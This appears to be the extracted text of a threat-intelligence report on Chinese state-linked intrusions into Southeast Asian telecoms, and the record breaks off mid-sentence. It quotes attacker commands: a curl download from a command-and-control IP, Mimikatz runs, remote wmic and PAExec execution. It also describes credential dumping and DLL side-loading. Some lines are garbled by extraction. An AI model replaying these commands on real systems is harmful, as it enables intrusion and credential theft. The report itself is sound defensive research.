{
    "id": "fcad4a49-f30a-45b6-be68-91f4fef61310",
    "created_at": "2023-01-12T15:05:53.828321Z",
    "updated_at": "2025-03-27T02:17:24.690336Z",
    "deleted_at": null,
    "sha1_hash": "721e2aa276476686753ce4cd7610a2c34b2f82f0",
    "title": "2021-08-03 - DeadRinger- Exposing Chinese Threat Actors Targeting Major Telcos",
    "authors": "",
    "file_creation_date": "2022-05-27T23:10:43Z",
    "file_modification_date": "2022-05-27T23:10:43Z",
    "file_size": 3855593,
    "plain_text": "# DeadRinger: Exposing Chinese Threat Actors Targeting Major Telcos\n\n**cybereason.com/blog/deadringer-exposing-chinese-threat-actors-targeting-major-telcos**\n\nWritten By\nCybereason Nocturnus\n\nAugust 3, 2021 | 27 minute read\n\n[Following the discovery of Hafnium attacks targeting Microsoft Exchange vulnerabilities, the Cybereason Nocturnus and Incident Response](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\nteams proactively hunted for various threat actors trying to leverage similar techniques in-the-wild. In the beginning of 2021, the Cybereason\nNocturnus Team investigated clusters of intrusions detected targeting the telecommunications industry across Southeast Asia. During the\ninvestigation, three clusters of activity were identified and showed significant connections to known threat actors, all suspected to be operating\non behalf of Chinese state interests.\n\n\n-----\n\ne epo t co es o t e ee s o t e de ad st at o s pub c ebu e o C a s [st y o State Secu ty o t e ece t](https://www.nytimes.com/2021/07/19/us/politics/microsoft-hacking-china-biden.html) U attac s\nthat exploited vulnerabilities in unpatched Microsoft Exchange Servers and put thousands of organizations worldwide at risk. Exploitation of\nthese same vulnerabilities were central to the success of the attacks detailed in this research.\n\nBased on our analysis, we assess that the goal of the attackers behind these intrusions was to gain and maintain continuous access to\ntelecommunication providers and to facilitate cyber espionage by collecting sensitive information, compromising high-profile business assets\n[such as the billing servers that contain Call Detail Record (CDR) data, as well as key network components such as the Domain Controllers,](https://en.wikipedia.org/wiki/Call_detail_record#:~:text=A%20call%20detail%20record%20(CDR,through%20that%20facility%20or%20device.)\nWeb Servers and Microsoft Exchange servers.\n\n_DeadRinger Overview Video_\n\n**[Cluster A: Assessed to be operated by Soft Cell, an activity group in operation since 2012, previously attacking Telcos in multiple](https://attack.mitre.org/groups/G0093/)**\n[regions including Southeast Asia, which was first discovered by Cybereason in 2019. We assess with a high level of confidence](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\nthat the Soft Cell activity group is operating in the interest of China. The activity around this cluster started in 2018 and continued\nthrough Q1 2021.\n**[Cluster B: Assessed to be operated by the Naikon APT threat actor, a highly active cyber espionage group in operation since 2010](https://attack.mitre.org/groups/G0019/)**\n[which mainly targets ASEAN countries. The Naikon APT group was previously attributed to the](https://cdn2.hubspot.net/hubfs/454298/Project_CAMERASHY_ThreatConnect_Copyright_2015.pdf) [Chinese People’s Liberation Army’s](https://en.wikipedia.org/wiki/People%27s_Liberation_Army)\n[(PLA) Chengdu Military Region Second Technical Reconnaissance Bureau (Military Unit Cover Designator 78020). The activity](https://cdn2.hubspot.net/hubfs/454298/Project_CAMERASHY_ThreatConnect_Copyright_2015.pdf)\naround this cluster was first observed in Q4 2020 and continued through Q1 2021.\n**Cluster C: A “mini-cluster” characterized by a unique OWA backdoor that was deployed across multiple Microsoft Exchange and**\nIIS servers. Analysis of the backdoor shows significant code similarities with a previously documented backdoor observed being\n[used in the operation dubbed Iron Tiger, which was attributed to a Chinese threat actor tracked by various researchers as Group-](http://www.erai.com/CustomUploads/ca/wp/2015_12_wp_operation_iron_tiger.pdf)\n3390 (APT27 / Emissary Panda). The activity around this cluster was observed between 2017 and Q1 2021.\n\n_The correlation between the three clusters_\n\nIt is noteworthy to mention that the Cybereason Nocturnus Team also observed an interesting overlap among the three clusters: In some\ninstances, all three clusters of activity were observed in the same target environment, around the same timeframe, and even on the same\nendpoints. At this point, there is not enough information to determine with certainty the nature of this overlap -- namely, whether these clusters\nrepresent the work of three different threat actors working independently, or whether these clusters represent the work of three different teams\noperating on behalf of a single threat actor. Regardless, we do offer several plausible hypotheses that might account for this observation.\n\nWe hope that the information provided in this report will assist in shedding light on further related intrusions, and as time goes by more\ninformation will be made available with regard to the connection between the clusters, the suspected threat actors, and the relationship\nbetween them.\n\n## Deadringer: Key Findings\n\n\n-----\n\n**dapt** **e,** **e s ste t a d** **as** **e** e g y adapt e attac e s o ed d ge t y to obscu e t e act ty a d a ta\npersistence on the infected systems, dynamically responding to mitigation attempts after having evaded security efforts since at\nleast 2017, an indication that the targets are of great value to the attackers.\n\n**Microsoft Exchange Vulnerabilities Exploited: Similar to the HAFNIUM attacks, the threat actors exploited recently disclosed**\nvulnerabilities in Microsoft Exchange Servers to gain access to the targeted networks. They then proceeded to compromise critical\nnetwork assets such as Domain Controllers (DC) and billing systems which contain highly sensitive information like Call Detail\nRecord (CDR) data, allowing them access to the sensitive communications of anyone using the affected telecoms’ services.\n\n**[High Value Espionage Targets: Based on previous findings from the Operation Soft Cell Report Cybereason published in 2019,](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)**\nas well as other published analysis of operations conducted by these threat actors, it is assessed that the telecoms were\ncompromised in order to facilitate espionage against select targets. These targets are likely to include corporations, political figures,\ngovernment officials, law enforcement agencies, political activists and dissident factions of interest to the Chinese government.\n\n**Operating in the Interest of China: Three distinct clusters of attacks have varying degrees of connection to APT groups Soft Cell,**\nNaikon and Group-3390 -- all known to operate in the interest of the Chinese government. Overlaps in attacker TTPs across the\nclusters are evidence of a likely connection between the threat actors, supporting the assessment that each group was tasked with\nparallel objectives in monitoring the communications of specific high value targets under the direction of a centralized coordinating\nbody aligned with Chinese state interests.\n\n## Acknowledgements\n\nResearch papers such as this one require collaboration and vigilance from multiple groups within the company. While the bulk of the report\nwas produced by Cybereason Nocturnus researchers Lior Rochberger, Tom Fakterman, Daniel Frank and Assaf Dahan, this research has not\nbeen possible without the tireless effort, analysis, attention to details and contribution of the Cybereason Incident Response and Security\nOperations teams. Special thanks and appreciation goes to Matt Hart, Akihiro Tomita, Yusuke Shimizu, Fusao Tanida, Niv Yona, Eli\n**Salem, Ilan Sokolovsky, and Omer Yampel.**\n\n[We invite you to join us for a webinar on Thursday, August 12th, at 1:00 PM ET / 10:00 AM PT where Cybereason's Head of Threat Research](https://www.cybereason.com/deadringer-exposing-chinese-threat-actors-targeting-major-telcos)\nAssaf Dahan and VP of Security Practices Mor Levi will walk through the espionage operations uncovered in the DeadRinger report.\n\n### Table of Contents\n\n**Executive Summary**\n\n**Key Findings**\n\n**Cluster A: Suspected Soft Cell Activity (2018-2021+)**\n\nPhase 1: Key Detected Activity\n\nPhase 2: Significant Changes in TTPs\n\nPhase 3: Significant Changes in TTPs\n\nPhase 4: Significant Changes in TTPs\n\nSimilarities to Operation Soft Cell\n\n**Cluster B: Suspected Naikon APT Activity**\n\nMaintaining Foothold: The Nebulae Backdoor\n\nLiving Off the Land - Using Built-In WindowsTools\n\nLateral Movement: PAExec\n\nLateral Movement: WMI and Net use\n\nCredential theft Mimikatz\n\nCredential Theft: EnrollLoger Keylogger\n\n**Cluster C: OWA Backdoor Activity (Mini-Cluster)**\n\nCustom OWA Backdoor - Core Functionality\n\nSimilarities with Iron Tiger OWA Backdoors\n\nConnections to Winnti’s Tools and Infrastructure\n\n\n-----\n\noss b e Co ect o et ee op c oope a d So t Ce\n\nAttributing Clusters A, B and C\n\nA Note on CTI Attribution\n\n**Conclusion**\n\n**MITRE ATT&CK BREAKDOWN (Cluster A - Soft Cell Activity)**\n\n**MITRE ATT&CK BREAKDOWN (Cluster B - Suspected Naikon APT Activity)**\n\n**MITRE ATT&CK BREAKDOWN (Cluster C - Custom OWA Backdoor)**\n\n### Cluster A: Suspected Soft Cell Activity (2018-2021+)\n\nFollowing up on Cybereason’s [discovery of the Soft Cell activity group in 2019, the Nocturnus Team continued to track the group’s activity and](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\nrelated breaches, which led us to find evidence that the group continued its operation - targeting Telcos in various regions, especially in\nSoutheast Asian countries, all the way to mid-2021.\n\nSimilar to our 2019 report, the attackers practiced the “Low and Slow“ approach, allowing them to maintain access and conduct their activity\nclandestinely without alerting the end users nor the security teams. Based on our investigation, this cluster consisted of four main phases, with\nearliest signs of intrusion going back to 2018.\n\nEach phase of the operation demonstrates the attackers’ adaptiveness in how they responded to various mitigation efforts, changing\ninfrastructure, toolsets, and techniques while attempting to become more stealthy. Though the attackers did change some of their tools and\ntechniques since their exposure, their core modus operandi and tools still seem to be inline with our previous findings.\n\nFrom the telemetry and forensic evidence available to us, it appears that the attackers gained initial access to the network by exploiting several\n[vulnerabilities in Microsoft Exchange servers, including the recent set of vulnerabilities published by Microsoft in March 2021. It is noteworthy](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)\nto mention that it appears the attackers had exploited the recent Microsoft Exchange vulnerabilities long before they became publicly known:\n\n_Timeline of the attack - Cluster 1_\n\n### Phase 1: Key Detected Activity\n\nEach phase starts with the exploitation of several Microsoft Exchange server vulnerabilities which grant the attackers an initial foothold on the\ntargeted network, ultimately allowing them to compromise additional assets. Following the exploitation, the attackers installed the China\nChopper WebShell on the compromised server and used it to perform a variety of tasks at each phase In the first phase the attackers mainly\n\n\n-----\n\nocused o eco a ssa ce act ty, app g out t e et o a d de t y g c t ca assets add t o, t ey dep oyed ot e too s t at a o ed\nthem to harvest credentials, move laterally in the network, and exfiltrate data:\n\n_China Chopper WebShell activity as seen in the Cybereason Defense Platform_\n\n[It is interesting to note that initially the attackers staged many of their tools in the $RECYCLE.BIN folder, in an attempt to hide them from users](https://attack.mitre.org/techniques/T1074/)\nand potentially avoid automatic detection by certain security tools. The exact same technique was also documented by Cybereason in our\n2019 [report Operation Soft Cell:](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\n\n### Reconnaissance\n\n[During the reconnaissance phase, the attackers used various built-in Windows tools such as net,](https://attack.mitre.org/software/S0039/) [query,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/query-process) [whoami,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami) [tasklist,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) [hostname, and](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/hostname) [ping](https://attack.mitre.org/software/S0097/)\nfor internal and external connectivity checks:\n\n_Reconnaissance commands executed via China Chopper WebShell_\n\nIn addition, the attackers used different scripts for reconnaissance. For example, one of the scripts is called “test.bat” and was used to execute\n[PortQry, a command-line utility that helps troubleshoot TCP/IP connectivity issues that reports the status of TCP and UDP ports on a remote](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/portqry-exe-command-line-utility)\n[machine, which can also be used for Active Directory reconnaissance. The binary itself was renamed to “psc.exe” by the attacker, probably in](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/use-portqry-verify-active-directory-tcp-ip-connectivity)\nan attempt to avoid detection.\n\n[The second script found was psloglist.bat, which runs Microsoft’s Sysinternals PsLogList tool and saves the security logs from the event viewer](https://docs.microsoft.com/en-us/sysinternals/downloads/psloglist)\nfrom the last 10 days:\n\n_The content of psloglist.bat_\n\n### Credential theft\n\n\n-----\n\noug out t e ope at o, t e attac e s used a ous too s a d tec ques to a est c ede t a s e ost co o too t ey used s t e\n[notorious Mimikatz. In the first phase, the attackers used the well-known PowerShell Empire Invoke-Mimikatz script, which was stored in the](https://attack.mitre.org/software/S0002/)\nsame directory as the WebShell itself:\n\n_Malware alert for nm.sp1 - PowerShell Empire invoke Mimikatz script_\n\nThe credentials were sent back to the attackers and were used for lateral movement and privilege escalation.\n\n### Lateral Movement\n\n[The attackers used different methods and tools to move laterally to different endpoints on the network, such as Cobalt Strike implants, WMI](https://attack.mitre.org/techniques/T1047/)\nand Net Use.\n\n### WMI and Net Use\n\nThe attackers used the command “net use” to configure connections to shared resources on the network, and to copy their tools to different\nsystems. After the tools were copied, the attackers were able to execute them remotely using WMI and by creating scheduled tasks remotely\nto run them:\n\n_Net Use commands as seen in the Cybereason Defense Platform_\n\n_Creation of remote scheduled tasks_\n\n_Executing scripts remotely using WMI_\n\n### Data Exfiltration\n\nIn an attempt to hide the contents of the stolen data, the threat actors [compressed and password-protected the data using the WinRAR tool.](https://attack.mitre.org/techniques/T1560/)\nThe RAR files were then placed in the C:\\users\\SUPPORT_388945a0\\Documents folder. This folder belongs to a built-in user account\n(SUPPORT_388945a0) that is used for help and support service, which is disabled by default but was purposefully enabled by the attacker.\nThe data was then exfiltrated using the China Chopper WebShell.\n\nIt is also interesting to mention that the nefarious use of this specific account (SUPPORT_388945a0) was previously seen with the Chinese\nAPT3 and the [Iranian Leafminer threat actors:](https://gist.github.com/MSAdministrator/7a61025263e279a740835da4b205e6d0)\n\n\n-----\n\n_Evidence of archived collected data using China Chopper_\n\nKnowing what data the attackers tried to exfiltrate can sometimes shed light on the attackers’ motivations. In our previous report about Soft\nCell, we were able to determine that the attackers exfiltrated CDR data from telecommunication providers in order to facilitate cyber espionage\nagainst specific individuals.\n\n### Maintaining Foothold: PcShare Backdoor\n\n[Aside from the China Chopper WebShell, the attackers relied heavily on a known backdoor named PcShare, whose](https://github.com/LiveMirror/pcshare) [code is publicly available](https://github.com/LiveMirror/pcshare)\n[and was reported being mostly used by Chinese threat actors attacking Southeast Asian countries. PcShare has the following capabilities:](https://blogs.blackberry.com/en/2019/09/pcshare-backdoor-attacks-targeting-windows-users-with-fakenarrator-malware)\n\nControlling the file system\nManipulation of system services\nUploading and downloading files\nProcess manipulation\nManipulating the Windows Registry\nExecuting arbitrary commands using Windows CMD Shell\nRebooting/shutting down the system\n\nDisplay message boxes to the user\n\nPcShare was executed via a Loader DLL (NvSmartMax.dll) and a Payload (NvSmartMax.dat) attempting to masquerade as a legitimate\nmodule by NVIDIA named “NvSmartMax.dll”: “NVIDIA Smart Maximise Helper Host” application (part of NVIDIA GPU graphics driver).\n\n[In most cases, the attackers used the legitimate nvSmarEx.exe to side-load the loader DLL (“NvSmartMax.dll”). The loader then decrypts the](https://attack.mitre.org/techniques/T1574/002/)\nPcShare core payload (“NvSmartMax.dat”) placed on the same directory. Interesting to note, the payload .dat file that was used during this\n[attack has the exact same hash mentioned in a report by BlackBerry from 2019, detailing the same execution technique used to stealthily load](https://blogs.blackberry.com/en/2019/09/pcshare-backdoor-attacks-targeting-windows-users-with-fakenarrator-malware)\nPcShare into memory.\n\nCybereason observed that in addition to what was reported by BlackBerry, the NvSmartMax.dll was also executed directly via rundll32.exe in\ncertain instances:\n\n_PcShare execution graph_\n\nThe execution of the backdoor on the remote machine revealed additional activities performed by the attackers, including:\n\nReconnaissance activity to collect information about the endpoint and network\nSearching for security tools and attempting to disable or kill their processes\nCreating two scheduled tasks for the Cobalt Strike loader: Microsoft\\Windows\\Wininet\\Config and\nMicrosoft\\Windows\\WindowsColorSystem\\Config\n[Using PowerShell to alter the creation time of the Cobalt Strike loader and payload files, a technique called timestomping, which is used](https://attack.mitre.org/techniques/T1070/006/)\nfor detection evasion\nExecuting the Cobalt Strike loader\n\n\n-----\n\n_The execution of the PcShare backdoor as seen in the Cybereason Defense Platform_\n\n### PcShare Continuously in Use Since 2018\n\nOur investigation revealed that the attackers were operating in the target network for at least two and a half years before Cybereason was\ndeployed on the environment. One piece of evidences that the attackers were present in the network from 2018 is the creation time of the\nPcShare binary:\n\n_Creation time of the PcShare backdoor as seen in the Cybereason Defense Platform_\n\nAnother piece of evidence that supports the assessment that the attackers were inside the network since 2018 is that the same IP address that\nwas hard-coded inside the PcShare backdoor mentioned above was also used in a scheduled task. The scheduled task used curl.exe binary in\norder to download a payload (a CAB file that contains the file “nvSmartEx.exe”) from the mentioned C2 and save it in the recycle.bin folder:\n\n\n-----\n\n_Scheduled task - [cmd.exe /c c:\\$recycle.bin\\curl.exe http://45.123.118[.]232/1.txt >c:\\$recycle.bin\\1.txt]_\n\n_The same IP address, embedded inside the PcShare binary_\n\nIn addition to the scheduled task above, the attackers created another scheduled task with the same name (VV1) on other machines in the\nnetwork. This task was different from the one above, and it was used to execute a bat script located under c:\\$recycle.bin\\q.bat, also created\nby the attackers.\n\n### Installing a VPN\n\n[In order to maintain persistence in the network and create easy access point to the network, the attackers installed SoftEther VPN, which they](https://www.softether.org/)\nrenamed to “oracll.exe” in order to evade detection. SoftEther helps disguise the traffic as benign on the target network. The same VPN client\nwas [previously observed in attacks involving the Soft Cell activity group:](https://attack.mitre.org/groups/G0093/)\n\n_Renamed SoftEther VPN binary_\n\n### Phase 2: Changes in TTPs\n\nIn addition to the activities performed in the first phase, such as reconnaissance activity or the use of PcShare and WMI - the attackers also\nused tools that were not used by them in the previous phase.\n\n[The attackers used a tool called Local Group, which is useful for adding and enumerating users in a domain, and a different Mimikatz, this time](https://www.joeware.net/freetools/tools/lg/index.htm)\nusing a DLL search order hijacking technique.\n\n[The attackers used the Local Group binary lg.exe with the command “-lu” that, according to the usage guide, enumerates all local groups and](https://www.joeware.net/freetools/tools/lg/usage.htm)\nmembers on a domain. This was executed remotely on the DC server, and the output was saved into “1.txt”:\n\n_Executing lg.exe - local group, and saving the output to 1.txt_\n\nAs mentioned, the attackers used the DLL search order hijacking technique in order to load Mimikatz. To do so, the attackers replaced the\nlegitimate DLL “mscorsvc.dll” and then executed the binary “mscorsvw.exe” which loads this DLL:\n\n\n-----\n\n_Preparing the files for DLL search order hijacking of the malicious mscorsvc.dll_\n\n[From the activities observed, the DLL executed Mimikatz, performed Pass-the-Hash and credential dumping, and performed some](https://attack.mitre.org/techniques/T1550/002/)\nreconnaissance commands using “net user”:\n\n_Execution of the mscorsvw.exe process with the malicious search order hijacked DLL, mscorsvc.dll_\n\n### Phase 3: Changes in TTPs\n\nThe third phase shares similarities with the initial phases, yet has its own unique characteristics, namely, with the introduction of new tools that\nwere not observed in the previous phases.\n\n[Those tools include a script used for AD database dumping, NBTScan,](https://sectools.org/tool/nbtscan/) [Dump Event Log tool, and again, a new Mimikatz executable. The](https://www.activexperts.com/admin/reskit/reskit2000/dumpel/)\n[attackers ran a script named a.bat remotely on several DCs, which is used to dump the Active Directory Database file (ntds.dit) using](https://adsecurity.org/?p=2398)\nNTDSUTIL’s IFM Creation (VSS shadow copy):\n\n_The creation, execution and deletion of a.bat_\n\n\n-----\n\n_The execution of a.bat as seen in the Cybereason Defense Platform_\n\nThe attackers extended their reconnaissance activity in phase three by executing NBTScan (named smnbt.exe), which is used for scanning IP\nnetworks for NetBIOS naming information, in addition to other native tools such as query.exe and dsget.exe:\n\n_Execution of the WebShell as seen in the Cybereason Defense Platform_\n\nAs observed in the other phases, the attackers harvested credentials using Mimikatz, but this time it was an executable (.exe) file named\ns6.exe and 26.exe (both have the same hash). The process was executed both by the WebShell and by using WMI. The output was saved into\na file named “1.txt” and “log.log”, and later sent to the attackers:\n\n_Saving the output of Mimikatz to 1.txt and log.log_\n\n### Phase 4: Changes in TTPs\n\nThe only addition observed between phase four compared to previous phases is that the attackers once again used a different Mimikatz\nexecutable named d64.exe. It was found in both folders: c:\\windows\\d64.exe and c:\\compaq\\d64.exe:\n\n\n-----\n\n_Prevention of d64.exe - Mimikatz_\n\n### Similarities to Operation Soft Cell\n\n[During the investigation, there were significant similarities to the activity described in Operation Soft Cell. Here are some of the similarities](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\nbetween the investigations:\n\n**Category** **Cluster A: Suspected Soft Cell Activity** **Operation Soft**\n**Cell**\n\n\n**Naming convention** Tools saved under C:\\PerfLogs\\\n\nC:\\perflogs\\s6.exe (Mimikatz)\n\nc:\\perflogs\\msnbt.exe (NBTScan)\n\nc:\\perflogs\\lg.exe (Local Group)\n\n\nTools saved under\nC:\\PerfLogs\\\n\nC:\\perflogs\\pl6.exe\n(Mimikatz)\n\nC:\\perflogs\\nbt.exe\n(NBTScan)\n\nc:\\perflogs\\lg.exe\n(Local Group)\n\n\nMimikatz execution:\n\n\"cmd\" /c cd /d C:\\PerfLogs\\&s6.exe\n>1.txt&echo [S]&cd&echo [E]\n\nRunning a script named “a.bat” remotely,\nusing WMI:\n\nwmic /node:[REDACTED] process call\ncreate a.bat&echo [S]&cd&echo [E]\n\n\nMimikatz execution:\n\n\"cmd\" /c cd /d C:\\PerfLogs\\&pl6.exe > 1.txt&echo [S]&cd&echo [E]\n\nRunning a script named “a.bat” remotely, using WMI:\n\nwmic /node:[REDACTED] /user:\"[REDACTED]\" /password:\"\n\n[REDACTED]\" process call create a.bat&echo [S]&cd&echo [E]\n\n\n-----\n\n**Shared tools used** Local Group (renamed “lg.exe” in both cases)\n\nPortQry (renamed “psc.exe” in both cases)\n\nSoftEther VPN (renamed in both cases)\n\nNBTScan (renamed in both cases)\n\nChina Chopper WebShell\n\nCobalt Strike Payloads\n\nNET commands\n\nModified Mimikatz\n\nWMI\n\n**Techniques / procedures** Exploiting the Exchange server every few months\n\nChange IOCs between phases\n\nHiding tools in the recycle.bin folder\n\nUse of the DLL search order hijacking technique\n\nRenaming binaries\n\nIn addition to the similarities observed among TTPs, there was another connection to the original Soft Cell report. In following the infrastructure\n[of the Soft Cell activity group and analyzing their tools, one tool got our attention: d64.exe, the Mimikatz binary observed in phase 4. This file’s](https://www.virustotal.com/gui/file/63adcd46ffd4c3b3959331723b6f97995731c5b299ec89ca7179fa7e708dc004/detection)\n[PDB pattern is very similar to other tools observed in the Operation Soft Cell report and related samples:](https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf)\n\n**PDB path observed in d64.exe** **PDB found in previous Soft Cell binaries**\n\nE:\\vs_proj\\mimkTools\\dcsync_new\\x64\\dcsync64.pdb E:\\simplify_modify\\x64\\simplify.pdb\n\nE:\\vs_proj\\simplify_modify\\Win32\\simplify.pdb\n\nPivoting from the files observed in the attack, other malicious files with the same PDB patterns (“E:\\vs_proj\\*” and \"E:\\simplify_modify\\*\") were\nfound which could be part of the Soft Cell activity group arsenal. Please refer to Appendix A for further details.\n\n### Cluster B: Suspected Naikon APT Activity\n\nDuring our investigation, as more evidence was collected, Cybereason identified another cluster of activity targeting Telcos in ASEAN\ncountries. This cluster exhibits rather unique TTPs compared to the ones detailed in Cluster A; namely the use of different tools and C2 server\ninfrastructure. In addition, this cluster’s activity was first observed in Q4 of 2020, while Cluster A goes back to 2018.\n\n[The main tool used in this cluster is the newly discovered Nebulae backdoor, which according to BitDefender is attributed to the Naikon APT](https://www.bitdefender.com/files/News/CaseStudies/study/396/Bitdefender-PR-Whitepaper-NAIKON-creat5397-en-EN.pdf)\ngroup. In addition, the attackers deployed a previously undocumented keylogger dubbed “EnrollLoger” on selected high-profile assets, most\nlikely to obtain sensitive information and to harvest credentials of high-privilege user accounts.\n\nAs previously mentioned, while Cluster B has its unique characteristics that separate it from Cluster A, there were some overlaps observed in\nterms of the victimology, time frame, the endpoints and some generic tools that were also observed in cluster A.\n\n### Maintaining Foothold: The Nebulae Backdoor\n\n[One of the unique tools spotted in the course of the attack is the rare Nebulae backdoor, which was first reported in April 2021 and attributed to](https://www.bitdefender.com/files/News/CaseStudies/study/396/Bitdefender-PR-Whitepaper-NAIKON-creat5397-en-EN.pdf)\nthe [Naikon group. The attackers evidently tried to evade detection by executing the backdoor in the context of legitimate and trusted](https://malpedia.caad.fkie.fraunhofer.de/actor/naikon)\n[applications that are vulnerable to DLL Side-Loading.](https://attack.mitre.org/techniques/T1574/002/)\n\n[For example, the attackers used the legitimate “chrome_frame_helper.exe” - which is part of Google's “Google Chrome Frame” - to load the](https://en.wikipedia.org/wiki/Google_Chrome_Frame)\nfake module “chrome_frame_helper.dll”, which contained the Nebulae backdoor payload:\n\n\n-----\n\n_Nebulae Backdoor execution as seen in the Cybereason Defense Platform_\n\nOnce Cybereason blocked and quarantined “chrome_frame_helper.dll”, the attackers immediately adapted by deploying the Nebulae backdoor\n[via a new legitimate application that is vulnerable to DLL Side-Loading. This time the attackers used “patchwrap.exe” which is a “Symantec](https://attack.mitre.org/techniques/T1574/002/)\nClient Management Component” that loads the malicious module “atl110.dll”.\n\nAs displayed below in the Cybereason Defense Platform, the exploitation of trusted security tools and especially anti-virus software is a very\nknown tactic used by many threat actors:\n\n_Nebulae Backdoor execution of various tasks as seen in the Cybereason Defense Platform_\n\nThe main features of the Nebulae backdoor include:\n\nReconnaissance and information gathering about infected hosts\nFile and process manipulation\nExecution of arbitrary commands\nPrivilege escalation\n\nC2 communications using raw sockets\n\n\n-----\n\nC data e c ypt o o co u cat o bet ee t e C a d t e ta get\n\nAccording to analysis of the backdoor’s code, we suspect that even though the Nebulae backdoor was first reported in April 2021, based on a\n[file uploaded to VT in January 2016, there are indications that first versions of the Nebulae backdoor were already being used since 2016:](https://www.virustotal.com/gui/file/d35c0cbcb05366f168d5a12a229f91a8f678b93fb2c08d1968bab1681c3ed3e7/details)\n\n_Historic submission data of an early Nebulae sample_\n\nThe backdoor communicates with the C2 in what seems to be a somewhat custom implementation of an RC4 encryption algorithm. Initially it\nusing a XOR key to decrypt the C2:\n\n_Decryption of the C2_\n\nFollowing this procedure, the malware collects data about the infected machine such as the user and machine names, operating system\nversion etc., then encrypts it and sends it to the C2. It then awaits further instructions and jumps to the corresponding method:\n\n_Jumptable for code execution according to the appropriate value_\n\n### Reconnaissance\n\n Living Off the Land - Using Built-In WindowsTools\n\nIn order to collect information about the network and endpoints, the attackers used different built-in Windows tools such as net commands,\nqueser, reg, systeminfo, tasklist, netstat, and ping for internal and external connectivity checks. In addition, the attackers used system\ncommands in order to perform a Ping scan, using the command “find /i\"ttl” to check for successful connections:\n\n\n-----\n\n_Execution of legitimate tools for reconnaissance and lateral movement as seen in the Cybereason Defense Platform_\n\n### Lateral Movement\n\n PAExec\n\n[The attackers used a renamed PAExec for lateral movement. PAExec is similar to sysinternal’s](https://www.poweradmin.com/paexec/) [PsExec, and it is a redistributable version of](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\nPsExec with some additional options. PAExec was used to connect to remote servers and execute additional tools. Both PAExec and PsExec\nare very common legitimate tools that are seen over and over in the context of cyberattacks and used by many threat actors:\n\nbackup.exe \\\\<IP Address> cmd.exe\n\n### WMI and Net use\n\nThe attackers used the command “net use” in order to access shared network resources on remote machines. Additionally, WMI was used to\nexecute tools such as the Nebulae Backdoor remotely.:\n\nwmic /node:<IP Address> /user:<User> /password:<Password> process call create \"C:\\Program Files (x86)\\Symantec\\Symantec Endpoint\nProtection\\PatchWrap.exe\"\n\n### Credential theft\n\n[The attackers used sysinternals’ ProcDump and](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) [Mimikatz to dump credentials from the domain controllers.](https://www.varonis.com/blog/what-is-mimikatz/)\n\n### ProcDump\n\nProcDump is a tool by Windows Sysinternals that is able to create dumps of processes in the system. The original purpose of ProcDump is to\ncreate dumps for troubleshooting issues, however attackers may use the tool in order to dump critical processes like lsass.exe for the purpose\nof extracting password hashes from its memory:\n\n\n-----\n\n_PAExec and ProcDump execution as seen in the Cybereason Defense Platform_\n\n### Mimikatz\n\n[The attackers used Mimikatz that masquerades as Internet Explorer. The metadata of the Mimikatz executable, along with the icon, were](https://www.varonis.com/blog/what-is-mimikatz/)\naltered to appear as an Internet explorer binary in an effort to be stealthy. Additionally, another Mimikatz executable similarly masquerades as\nGoogle Chrome, and was found among the tools of cluster B:\n\n_PAExec and Mimikatz execution as seen in the Cybereason Defense Platform_\n\n### EnrollLoger Keylogger\n\n[One of the tools used by the attackers was a custom-built keylogger dubbed “EnrollLogger” by Cybereason. In order to hide the malicious](https://en.wikipedia.org/wiki/Keystroke_logging)\n[activity, the attackers deployed a legitimate South-Korean multimedia player called “Potplayer” that has a](https://en.wikipedia.org/wiki/PotPlayer) [known DLL-hijacking vulnerability,](https://github.com/fireeye/DueDLLigence)\nalong with a trojanized DLL file called PotPlayer.dll.txt [(VT link) that is loaded to Potplayer.exe upon execution, making it appear legitimate:](https://www.virustotal.com/gui/file/ea2c87eb957a749560237b19b82f7136330b9781d449dd22809154385ef1c032/detection/f-ea2c87eb957a749560237b19b82f7136330b9781d449dd22809154385ef1c032-1613619579)\n\n_Keylogger execution as seen in the Cybereason Defense Platform_\n\nAt the time of the attack, the malicious DLL had a very low detection rate:\n\n_Detection rate of the keylogger in VirusTotal_\n\nThe fake DLL has several empty exports, and the export that contains the malicious code is called PreprocessCmdLineExW.\n\n[The keylogger uses the GetKeyState() function to monitor the users’ keystrokes, saving it to an allocated buffer in memory.](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate)\n\nIn addition, the keylogger also steals data stored on Windows’ Clipboard. The collected keystrokes and clipboard data along with other\ninformation is then XOR-encrypted (each byte with 0xaf if it equals zero, or with 0xaa in case it doesn’t) and saved in text files located in a\ndirectory created by the keylogger:\n\n\n-----\n\n_C \\Use s\\use \\ pp ata\\ oa_ _g\\_ _c oso t\\ et o_ _\\cac e_\n\n_Data saved by the keylogger_\n\nAn example of a decrypted file looks like this:\n\n_Decrypted data file that was collected by the Keylogger_\n\n### Cluster C: OWA Backdoor Activity (Mini-Cluster)\n\nDuring the investigation, we revealed a third cluster, which is in fact a mini-cluster characterized mainly by the deployment of multiple instances\nof a custom [OWA (Outlook Web Access) backdoor. The backdoor was used to harvest credentials of users logging into Microsoft OWA](https://en.wikipedia.org/wiki/Outlook_on_the_web)\nservices, granting the attackers the ability to access the environment stealthily.\n\nAccording to the forensic evidence available to us, the earliest indications of use of this backdoor begin in 2017. The deployment of the\nbackdoor continued all the way to 2021, bearing the hallmark of a true advanced persistent threat (APT). From 2017-2020 we have observed\nonly a few instances of the backdoor. However, in March 2021, the attackers installed the backdoor 